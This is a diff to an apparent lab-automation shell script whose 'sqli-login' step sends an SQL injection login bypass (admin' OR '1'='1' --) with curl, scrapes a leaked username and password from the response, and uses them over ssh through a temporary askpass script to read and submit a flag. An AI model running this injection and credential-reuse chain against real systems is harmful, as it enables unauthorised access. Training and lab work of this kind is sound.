@@ -60,6 +60,7 @@ step_wrap_round() {
 
 # -- Lab 1: sqli-login -- boolean-true username closes the quote, admin's row matches regardless
 # of password (same payload the lab's hints walk a student to: a single quote, then OR '1'='1').
+# The portal then lists a host account; ssh in with it and read flag.txt.
 step_sqli_login() {
   narrate "Lab 1 -- sqli-login: starting the target"
   local addr flag port
@@ -73,11 +74,24 @@ step_sqli_login() {
     return 0
   fi
   narrate "login portal on port $port -- closing the username's quote with OR '1'='1'"
-  flag="$(curl -s -X POST "http://$addr:$port/login" \
-    --data-urlencode "username=admin' OR '1'='1' -- " --data-urlencode 'password=anything' \
-    | extract_flag)"
+  local page user pass askpass
+  page="$(curl -s -X POST "http://$addr:$port/login" \
+    --data-urlencode "username=admin' OR '1'='1' -- " --data-urlencode 'password=anything')"
+  user="$(printf '%s' "$page" | sed -n 's/.*Username: <code>\([^<]*\)<.*/\1/p' | head -1)"
+  pass="$(printf '%s' "$page" | sed -n 's/.*Password: <code>\([^<]*\)<.*/\1/p' | head -1)"
+  if [ -z "$user" ] || [ -z "$pass" ]; then
+    narrate "sqli-login: no service account behind the login this round -- skipping"
+    return 0
+  fi
+  narrate "the IT notes list a host account ($user) -- trying it over ssh"
+  askpass="$(mktemp)"
+  printf '#!/bin/sh\necho "%s"\n' "$pass" > "$askpass"
+  chmod 700 "$askpass"
+  flag="$(SSH_ASKPASS="$askpass" SSH_ASKPASS_REQUIRE=force ssh -o StrictHostKeyChecking=accept-new \
+    -o PubkeyAuthentication=no "$user@$addr" 'cat flag.txt' 2>/dev/null | extract_flag)"
+  rm -f "$askpass"
   if [ -z "$flag" ]; then
-    narrate "sqli-login: no flag in the response this round -- skipping submit"
+    narrate "sqli-login: no flag over ssh this round -- skipping submit"
     return 0
   fi
   run_cmd "dojo-flag submit sqli-login '$flag'"
